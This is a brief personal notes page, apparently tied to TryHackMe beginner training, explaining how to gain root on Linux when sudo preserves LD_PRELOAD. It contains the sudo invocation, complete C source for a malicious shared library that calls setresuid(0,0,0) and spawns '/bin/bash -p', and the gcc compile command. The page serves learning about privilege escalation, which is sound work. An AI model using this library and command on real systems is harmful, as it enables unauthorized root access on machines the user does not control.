# Exploiting LD_PRELOAD

If LD_PRELOAD is preserved by sudo, then itâ€™s possible to use a malicious dynamic library to gain root access â€” just run `sudo LD_PRELOAD=/path/to/malicious.so program-runnable-with-nopasswd`. [Preserved environment variables are listed by `sudo -l`.](enumerate-sudo-access.md)

A simple malicious library (perhaps *the* simplest) that can exploit the LD_PRELOAD trick is:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Compile with:

```bash
gcc -fPIC -shared -nostartfiles -o /path/to/malicious.so /path/to/malicious.c
```

## References

* [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)

- - - -

ðŸ‘¤ Nathan Acks  
ðŸ“… October 31, 2021
